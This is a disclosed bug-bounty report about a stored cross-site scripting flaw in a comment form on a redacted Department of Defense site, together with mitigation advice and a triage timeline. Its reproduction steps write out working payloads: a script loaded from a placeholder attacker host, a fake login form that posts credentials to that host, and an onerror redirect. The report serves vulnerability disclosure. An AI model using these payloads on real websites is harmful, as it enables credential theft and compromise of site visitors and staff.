---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-09-29
submitted: 2020-07-03T22:22:09.573Z
bounty_usd: null
votes: 8
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "z32"
source: "https://hackerone.com/reports/915073"
title: "Stored XSS via Comment Form at ████████"
---
# Stored XSS via Comment Form at ████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-09-29

- Report: [https://hackerone.com/reports/915073](https://hackerone.com/reports/915073)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-07-03T22:22:09.573Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
An attacker can submit a comment form with injected HTML, leading to a number of malicious effects

## Step-by-step Reproduction Instructions

1. Browse to https://████
2. Complete the form. I placed `"><script src=http://attackerip/blind.js/>` in the `Name` field. Some example payloads for the `Comments` field are as follows:

For credential theft, an attacker could place `<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>` in the `Comments` field.
███████
████

To redirect to a malicious website, an attacker could use `<img src=x onerror='javascript:window.open("http://catcompusa.com")'></img>`.
██████
The malicious website will open in a new tab when the image fails to load as shown below:
█████████

## Conclusions
- This leads me to believe that once a █████████ employee reads the comment, the code will be injected into their browser as well.
- Additionally, the blind XSS payload injected into the `Name` field seemed to cause a hit on my weblog from `█████████` and `██████████`.
█████

## Suggested Mitigation/Remediation Actions
Sanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.

## Impact

The attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the █████ website and potentially other internal resources.

## Timeline

- **Report Filed**
- **2020-07-03** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Title Updated**
- **2020-07-06** @agent-l8: @un4gi how long were you waiting to get the responses on your machine? Not getting anything coming back from collab/xsshunter or personal server. Thanks!
- **Report Needs More Info**
- **Report New**
- **2020-07-07** @agent-l8: Okay- same severity either way, but I couldnt get the blind to work so wanted to check. Thanks!
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
